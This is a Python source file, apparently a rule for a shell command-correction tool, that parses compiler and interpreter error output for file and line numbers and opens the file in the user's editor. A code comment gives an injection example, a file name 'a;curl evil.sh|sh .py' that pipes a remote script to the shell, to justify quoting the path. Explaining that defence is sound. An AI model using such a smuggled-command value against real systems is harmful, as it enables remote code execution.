import re
import os
from thebleep.utils import memoize, default_settings
from thebleep.conf import settings
from thebleep.shells import shell


# order is important: only the first match is considered
patterns = (
    # js, node:
    '^    at {file}:{line}:{col}',
    # cargo:
    '^   {file}:{line}:{col}',
    # python, thebleep:
    '^  File "{file}", line {line}',
    # awk:
    '^awk: {file}:{line}:',
    # git
    '^fatal: bad config file line {line} in {file}',
    # llc:
    '^llc: {file}:{line}:{col}:',
    # lua:
    '^lua: {file}:{line}:',
    # fish:
    '^{file} \\(line {line}\\):',
    # bash, sh, ssh:
    '^{file}: line {line}: ',
    # cargo, clang, gcc, go, pep8, rustc:
    '^{file}:{line}:{col}',
    # ghc, make, ruby, zsh:
    '^{file}:{line}:',
    # perl:
    'at {file} line {line}',
)


# for the sake of readability do not use named groups above
def _make_pattern(pattern):
    pattern = pattern.replace('{file}', '(?P<file>[^:\n]+)') \
                     .replace('{line}', '(?P<line>[0-9]+)') \
                     .replace('{col}', '(?P<col>[0-9]+)')
    return re.compile(pattern, re.MULTILINE)


patterns = [_make_pattern(p).search for p in patterns]


@memoize
def _search(output):
    for pattern in patterns:
        m = pattern(output)
        if m and os.path.isfile(m.group('file')):
            return m


def match(command):
    if 'EDITOR' not in os.environ:
        return False

    return _search(command.output)


@default_settings({'fixlinecmd': u'{editor} {file} +{line}',
                   'fixcolcmd': None})
def get_new_command(command):
    m = _search(command.output)

    # Note: there does not seem to be a standard for columns, so they are just
    # ignored by default
    # The file is quoted. It is read out of whatever the failed command printed
    # and it has to exist for this rule to fire at all -- but a file that exists
    # is not a file you chose: cloning a repository or unpacking an archive is
    # enough to put `a;curl evil.sh|sh .py` on disk, and the name then goes
    # through `{file}` into a command the shell evaluates.
    path = shell.quote(m.group('file'))
    if settings.fixcolcmd and 'col' in m.groupdict():
        editor_call = settings.fixcolcmd.format(editor=os.environ['EDITOR'],
                                                file=path,
                                                line=m.group('line'),
                                                col=m.group('col'))
    else:
        editor_call = settings.fixlinecmd.format(editor=os.environ['EDITOR'],
                                                 file=path,
                                                 line=m.group('line'))

    return shell.and_(editor_call, command.script)
